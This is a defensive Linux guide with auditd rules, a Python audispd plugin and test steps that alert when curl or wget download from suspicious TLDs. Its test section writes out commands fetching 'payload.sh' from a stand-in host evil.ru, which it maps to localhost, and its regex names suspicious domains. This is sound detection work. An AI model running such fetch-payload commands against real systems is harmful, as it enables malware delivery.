## auditd rules (exec + write)

Create /etc/audit/rules.d/curl_wget_downloads.rules:
```bash
## --- Capture exec of curl / wget (both 64/32-bit) ---
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -F auid>=1000 -F auid!=4294967295 -k curl_exec
-a always,exit -F arch=b32 -S execve -F exe=/usr/bin/curl -F auid>=1000 -F auid!=4294967295 -k curl_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -F auid>=1000 -F auid!=4294967295 -k wget_exec
-a always,exit -F arch=b32 -S execve -F exe=/usr/bin/wget -F auid>=1000 -F auid!=4294967295 -k wget_exec

## --- Capture file creation/writes by curl / wget (download behavior) ---
# Open for write/create via openat()/creat() by curl
-a always,exit -F arch=b64 -S openat,creat -F comm=curl -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k curl_write
-a always,exit -F arch=b32 -S openat,creat -F comm=curl -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k curl_write

# Same for wget
-a always,exit -F arch=b64 -S openat,creat -F comm=wget -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k wget_write
-a always,exit -F arch=b32 -S openat,creat -F comm=wget -F auid>=1000 -F auid!=4294967295 -F exit>=0 -k wget_write
```

Reload rules:

```bash
sudo augenrules --load
# or
sudo service auditd restart
```

**Why these rules work**

- ```execve``` + ```exe=/usr/bin/curl|wget``` captures the process invocation with EXECVE and PROCTITLE records that include full arguments (URLs).

- ```openat,creat``` + ```comm=curl|wget``` captures file creation/writes attributable to these tools (the “download happened” signal).

- ```auid>=1000``` keeps focus on human users (normal interactive accounts), avoiding system daemons.

- We log both b64 and b32 for completeness.

Optional noise-reduction: if downloads only matter in specific trees, add ```-F dir=/home``` (and/or ```/tmp```, ```/var/tmp```, etc.) to the write rules. Example:
```-a always,exit -F arch=b64 -S openat,creat -F dir=/home -F comm=curl -F auid>=1000 -k curl_write_home```

**2) Real-time audispd “alert” filter (TLD match)**

We’ll add a small audispd plugin that reads audit events and triggers an alert when the EXECVE/PROCTITLE shows curl/wget talking to a suspicious TLD.

**2.1 Install the plugin**

Create ```/usr/local/sbin/audispd-curl-wget-tld```:
```bash
#!/usr/bin/env python3
import sys, re, json, time

# TUNE: suspicious TLDs
tld_re = re.compile(r'\.(ru|cn|su|tk|top|xyz|zip|click|pw)(?:/|:|$)', re.IGNORECASE)

# A minimal parser: read lines, buffer records, scan EXECVE/PROCTITLE content
buf = []
def flush_and_check(records):
    # Gather helpful info
    raw = "\n".join(records)
    # Quick check: only inspect events that include curl/wget and execve/proctitle
    if "type=EXECVE" not in raw and "type=PROCTITLE" not in raw:
        return
    if "comm=\"curl\"" not in raw and "comm=\"wget\"" not in raw:
        return

    # Pull arguments from EXECVE and PROCTITLE lines
    # EXECVE lines look like: type=EXECVE ... a0="curl" a1="http://evil.ru/payload.sh" ...
    urls = []
    for line in records:
        if "type=EXECVE" in line or "type=PROCTITLE" in line:
            # naive extraction of http(s)://... or host/path tokens
            for tok in re.findall(r'((?:https?://)?[A-Za-z0-9._-]+\.[A-Za-z]{2,}(?:/[^\s"]*)?)', line):
                urls.append(tok)

    # Match suspicious TLDs
    matches = [u for u in urls if tld_re.search(u)]
    if matches:
        ts = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        # Emit a syslog-like alert to stdout (audispd will syslog it)
        print(f'{ts} AUDIT-ALERT suspicious TLD via curl/wget: {", ".join(matches)}', flush=True)

for line in sys.stdin:
    line = line.rstrip("\n")
    if not line:
        continue
    buf.append(line)
    # Events are separated by '----' (audispd batches); be liberal:
    if line.startswith("type=EOE") or line.startswith("----"):
        flush_and_check(buf)
        buf = []
```

**Permissions**:
```bash
sudo chmod 0755 /usr/local/sbin/audispd-curl-wget-tld
```
**2.2 Enable it in audispd**

Create ```/etc/audisp/plugins.d/curl_wget_tld.conf```:
```ini
active = yes
direction = in
path = /usr/local/sbin/audispd-curl-wget-tld
type = builtin
format = string
```

Restart:
```bash
sudo service auditd restart
```
**Why this works**

- audispd feeds audit events to our script in near-real-time.

- We inspect command-line arguments logged by EXECVE/PROCTITLE, extract tokens that look like hosts/URLs, and regex-match TLDs.

- When matched, we print an “alert” line which audispd sends to syslog/journal (visible via ```journalctl -u``` ```auditd``` or ```/var/log/messages/```/```var/log/syslog``` depending on distro).

## How to test (HTTP + SNI not required)

**A) Quick HTTP test (no internet needed)**

**1. Map a fake suspicious domain:**
```bash
echo "127.0.0.1 evil.ru" | sudo tee -a /etc/hosts
```

**2. Serve a file locally:**
```bash
mkdir -p ~/webroot && cd ~/webroot
echo "test" > payload.sh
python3 -m http.server 8000
```

**3. Download with curl (triggers exec + write; plugin matches .ru):**
```bash
curl http://evil.ru:8000/payload.sh -o /tmp/payload.sh
```

**4. See the “alert” line:**
```bash
# Real-time plugin alert (journal or syslog)
journalctl -u auditd --since "2 minutes ago" | grep 'AUDIT-ALERT' -i

# Or confirm audit records were generated
sudo ausearch -k curl_exec --format text --start recent
sudo ausearch -k curl_write --format text --start recent
```

You should see something like:
```bash
... AUDIT-ALERT suspicious TLD via curl/wget: http://evil.ru/payload.sh
```
**B) Wget test**
```bash
wget http://evil.ru:8000/payload.sh -O /tmp/payload2.sh
journalctl -u auditd --since "2 minutes ago" | grep 'AUDIT-ALERT' -i
```
## Notes & tuning

- TLD list: Update tld_re in the plugin to your intel (start narrow).

- False positives: If dev workflows use these TLDs, restrict by user (auid), time windows, or only certain directories (e.g., -F dir=/home, /tmp).

- HTTPS still works: Even if content is encrypted, the URL/host still appears in the command line to curl/wget, so we can match TLDs from arguments.

- Operationalizing: Route AUDIT-ALERT lines to your SIEM and attach an alert rule (e.g., Splunk sourcetype=linux:audit logs with keyword AUDIT-ALERT).

- Performance: The audit rules here are narrow (only curl/wget exec + writes) and generally low-overhead on modern systems.
